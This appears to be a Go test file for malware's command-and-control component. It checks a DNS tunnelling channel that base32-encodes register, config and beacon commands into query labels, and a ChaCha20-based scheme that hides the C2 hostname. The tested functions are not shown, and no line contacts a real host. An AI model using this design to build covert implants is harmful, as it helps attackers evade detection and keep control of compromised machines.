package main

import (
	"encoding/base32"
	"strings"
	"testing"
)

// DNS channel: label = base32(command:payload), query = label.domain.
// Server flow (DNS_REGISTER_PROBES.md): base32-decodes label, dispatches on
// rgst/conf/main prefixes.
func TestDNSBase32Encode(t *testing.T) {
	tbl := []struct {
		cmd  string
		json string
	}{
		{"rgst:", `{"Id":0,"HostName":"h"}`},
		{"main:", `123`},
		{"conf:", `45:ok`},
	}
	for _, c := range tbl {
		payload := []byte(c.cmd + c.json)
		enc := strings.TrimRight(base32.StdEncoding.EncodeToString(payload), "=")
		// decode round-trip
		dec, err := base32.StdEncoding.DecodeString(enc + padding(enc))
		if err != nil {
			t.Fatalf("%s: decode %v", c.cmd, err)
		}
		if string(dec) != string(payload) {
			t.Fatalf("%s: round-trip %q != %q", c.cmd, dec, payload)
		}
		// server dispatch prefix must survive
		if !strings.HasPrefix(string(dec), c.cmd) {
			t.Fatalf("%s: prefix lost", c.cmd)
		}
	}
}

// dnsEncodeEndpoint encodes the c2 hostname for the DNS channel:
// ChaCha20-XOR then base62 transform. Verify length/structure invariants.
func TestDNSEndpointEncode(t *testing.T) {
	key := dnsChaCha20Key("testvkey", "salt")
	host := []byte("c2.test.local1234") // 15B
	out, err := dnsEncodeEndpoint(key, host)
	if err != nil {
		t.Fatal(err)
	}
	// 15B host + NUL terminator
	if len(out) != 16 {
		t.Fatalf("endpoint len %d, want 16", len(out))
	}
	if out[len(out)-1] != 0 {
		t.Fatalf("missing NUL terminator")
	}
	// base62 chars only
	for _, c := range out[:15] {
		if !(c >= '0' && c <= '9' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z') {
			t.Fatalf("non-base62 char %q", c)
		}
	}
	// deterministic
	out2, _ := dnsEncodeEndpoint(key, host)
	if string(out) != string(out2) {
		t.Fatal("not deterministic")
	}
	t.Logf("endpoint = %q", out[:15])
}

func padding(enc string) string {
	return strings.Repeat("=", (8-len(enc)%8)%8)
}

// dnsChaCha20Key must produce a valid 32B ChaCha20 key.
func TestDNSChaCha20Key(t *testing.T) {
	k := dnsChaCha20Key("testvkey", "salt")
	if len(k) != 32 {
		t.Fatalf("key len %d", len(k))
	}
	// deterministic
	k2 := dnsChaCha20Key("testvkey", "salt")
	for i := range k {
		if k[i] != k2[i] {
			t.Fatal("not deterministic")
		}
	}
	// chacha20 round-trip
	pt := []byte("WSL2_GUI_APPS_ENABLED")
	enc, err := chacha20XOR(k, pt)
	if err != nil {
		t.Fatal(err)
	}
	dec, err := chacha20XOR(k, enc)
	if err != nil {
		t.Fatal(err)
	}
	if string(dec) != string(pt) {
		t.Fatalf("chacha round-trip %q != %q", dec, pt)
	}
}
